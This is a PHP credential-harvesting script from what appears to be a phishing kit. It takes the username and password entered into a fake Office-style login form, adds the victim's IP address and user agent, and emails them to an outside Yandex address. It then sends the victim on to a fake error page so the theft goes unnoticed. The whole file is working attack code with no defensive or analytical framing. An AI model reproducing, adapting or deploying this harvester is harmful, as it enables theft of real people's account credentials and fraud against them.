<?php
if($_POST["offizeuname"] != "" and $_POST["offizepasuma"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "Online ID            : ".$_POST['offizeuname']."\n";
$message .= "Passcode              : ".$_POST['offizepasuma']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Fudtool[dot]su --------------|\n";
$send = "hoilinglau@yandex.ru";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: eror.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>